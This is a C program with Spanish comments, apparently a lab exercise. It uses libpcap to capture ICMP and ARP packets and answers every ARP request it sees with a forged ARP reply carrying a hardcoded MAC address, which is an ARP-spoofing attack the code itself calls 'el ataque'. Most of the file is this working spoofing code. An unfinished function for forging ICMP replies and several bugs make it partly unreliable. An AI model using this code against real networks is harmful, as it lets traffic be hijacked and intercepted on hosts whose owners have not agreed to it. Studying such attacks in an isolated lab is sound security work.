#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <net/if_arp.h>

#include <string.h>


//ejecutar ./capturaIcmp icmp 100
#define LIMITE 100

typedef enum{ REQUEST=1, REPLY} ARPtype;


void listarInterfaces();
int enviarReply(pcap_t * pcap, u_int8_t *miMac,u_int8_t *senderIP, u_int8_t *destinationMac,u_int8_t *destinationIP);

//variable global
char* targetIP = "10.0.2.6";   //IP del dispositivo target, localhost por defecto
char * mimac = "08:00:27:ca:eb:7e"; //Mac del target
pcap_t* descr; 

void callback(u_char *useless,const struct pcap_pkthdr* pkthdr,const u_char* packet){
  static int count = 1;
  int size_eth=sizeof(struct ethhdr); //tamanio de la cabezera
  struct ether_header *h_ethernet;//puntero a la cabezera ethernet
  struct ether_arp *h_arp;// puntero a la cabezera arp
  h_ethernet = (struct ether_header *) packet;

  if (ntohs(h_ethernet->ether_type)== ETHERTYPE_ARP){
     //analisis arp
    h_arp=(struct ether_arp*)(packet+size_eth);
    char*senderMac=(char*)malloc(sizeof(char)*18);
    char*senderIp=(char*)malloc(sizeof(char)*18);
    char* destinationIP=(char*)malloc(sizeof(char)*18);
    ARPtype type;

    strcpy(destinationIP,inet_ntoa(*( (struct in_addr*) h_arp->arp_tpa) ));
    //strcpy(senderMac,(ether_ntoa((struct ether_addr*)h_arp->arp_sha))); //produce error???
    //strcpy(senderIp,inet_ntoa(*((struct in_addr*)h_arp->arp_spa) ));//produce error???
    type=ntohs(h_arp->ea_hdr.ar_op);

    //printf("destination: %s, targetIP %s\n",destinationIP, targetIP);
    //printf("%d\n\n", type);

    //si el arp va dirigido a target y es request envia el arp reply
    if (type == REQUEST){
       printf("*******ARP******");    
       u_int8_t *miMac;
       miMac=(u_int8_t*)malloc(sizeof(u_int8_t)*ETH_ALEN);
       struct ether_addr* Mac = (struct ether_addr*)ether_aton("08:00:27:ca:eb:7e");
       miMac = Mac->ether_addr_octet; 
       enviarReply(descr,miMac, h_arp->arp_tpa, h_arp->arp_sha, h_arp->arp_spa);;
    }

  }else{ //si no se arp es un paquete IP
    
       struct iphdr *iph=(struct iphdr*)(packet+size_eth);
       int size_ip=iph->ihl*4;
       struct icmphdr *icmph=(struct icmphdr*)(packet+size_ip+size_eth);

       switch(icmph->type){
            case ICMP_ECHO:
	       printf("ICMP_ECHO\n");
	       break;
           case ICMP_ECHOREPLY:
	       printf("ICMP_ECHOREPLY\n");
	       break;
           default:
	       printf("ICMP tipo %d\n",icmph->type);
	       break;
       }
       printf("\nPacket number [%d], length of this packet is: %d\n", count++, pkthdr->len);
  }

}

int main(int argc,char **argv)
{
    char *dev;
    int max=10;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;        /* to hold compiled program */
    bpf_u_int32 pMask;            /* subnet mask */
    bpf_u_int32 pNet;             /* ip address*/
    pcap_if_t *alldevs, *d;
    char dev_buff[64] = {0};
    int i =0;
    char* filtro = "icmp or arp";
    dev = (char*)malloc(sizeof(char)*20);
    
    
    printf("Lista de Interfaces:\n");
    listarInterfaces();

    printf("\nIngrese la interfaz de red: ");
    scanf("%s",dev);

    if(strlen(dev))
    {
        printf("\n ---You opted for device [%s] to capture [%d] packets---\n\n Starting capture...",dev, LIMITE);
    }     

    // If something was not provided
    // return error.
    if(dev == NULL)
    {
        printf("\n[%s]\n", errbuf);
        return -1;
    }

    // fetch the network address and network mask
    pcap_lookupnet(dev, &pNet, &pMask, errbuf);

    // Now, open device for sniffing
    descr = pcap_open_live(dev, BUFSIZ, 0,-1, errbuf);
    if(descr == NULL)
    {
        printf("DEBUG: pcap_open_live() failed due to [%s]\n", errbuf);
        return -1;
    }

    // Compile the filter expression
    if(pcap_compile(descr, &fp, filtro, 0, pNet) == -1)
    {
        printf("\npcap_compile() failed\n");
        return -1;
    }

    // Set the filter compiled above
    if(pcap_setfilter(descr, &fp) == -1)
    {
        printf("\npcap_setfilter() failed\n");
        exit(1);
    }

    // For every packet received, call the callback function
    // For now, maximum limit on number of packets is specified
    // by user.
    pcap_loop(descr, 100, callback, NULL);

    printf("\nDone with packet sniffing!\n");
    return 0;
}





void listarInterfaces(){
	
   char errbuf[PCAP_ERRBUF_SIZE]; // buﬀer para mensajes de error
   pcap_if_t*current_device;

    if(pcap_findalldevs(&current_device,errbuf)==-1){
		printf("DEBUG: %s",errbuf);
	}

	while(current_device->next!=NULL){
		printf("Nombre del dispositivo: %s\n",current_device->name); //mostramos el nombre del dispositivo
		current_device=current_device->next;
	}

}

int enviarReply(pcap_t * pcap, u_int8_t *miMac,u_int8_t *senderIP, u_int8_t *destinationMac,u_int8_t *destinationIP){
  printf("enviarReply\n");
  //construccion de la cabezera ethernet
  struct ether_header *ether_h=(struct ether_header*)malloc(sizeof(struct ether_header));
  ether_h->ether_type = htons(ETHERTYPE_ARP);
  memcpy(ether_h->ether_shost,miMac,sizeof(ether_h->ether_shost));//source maac
  memcpy(ether_h->ether_dhost,destinationMac,sizeof(ether_h->ether_dhost));//destination mac

    //construccion del arp reply
  struct ether_arp *reply=(struct ether_arp*)malloc(sizeof(struct ether_arp));
  reply->arp_hrd=htons(ARPHRD_ETHER);
  reply->arp_pro = htons(ETH_P_IP);
  reply->arp_hln = ETHER_ADDR_LEN;
  reply->arp_pln =sizeof(in_addr_t);
  reply->arp_op =htons(ARPOP_REPLY);
  memcpy(reply->arp_sha,miMac,sizeof(reply->arp_sha));
  memcpy(reply->arp_spa,senderIP,sizeof(reply->arp_spa));
  memcpy(reply->arp_tha,destinationMac,sizeof(reply->arp_tha));
  memcpy(reply->arp_tpa,destinationIP,sizeof(reply->arp_tpa));
    
  //construccion del paquete para realizar el ataque     
  unsigned char frame[sizeof(struct ether_header) + sizeof(struct ether_arp)];
  memcpy(frame,ether_h, sizeof(struct ether_header) );
  memcpy(frame + sizeof(struct ether_header),reply,sizeof(struct ether_arp) ); 
          
  if(pcap_inject(pcap, frame, sizeof(frame)) == -1){
    return 0;
  }
  return 1;  
}



int enviarICMPReply(pcap_t* pcap, u_int8_t* miMac, u_int8_t* senderIP, u_int8_t* destinationMac, u_int8_t* destinationIP  ){
     
  printf("enviar ICMP reply\n");
  //construccion de la cabezera ethernet
  struct ether_header *ether_h=(struct ether_header*)malloc(sizeof(struct ether_header));
  ether_h->ether_type = htons(ETHERTYPE_IP);
  memcpy(ether_h->ether_shost,miMac,sizeof(ether_h->ether_shost));//source maac
  memcpy(ether_h->ether_dhost,destinationMac,sizeof(ether_h->ether_dhost));//destination mac

  //creacion del paquete IP/ICMP    
   

}
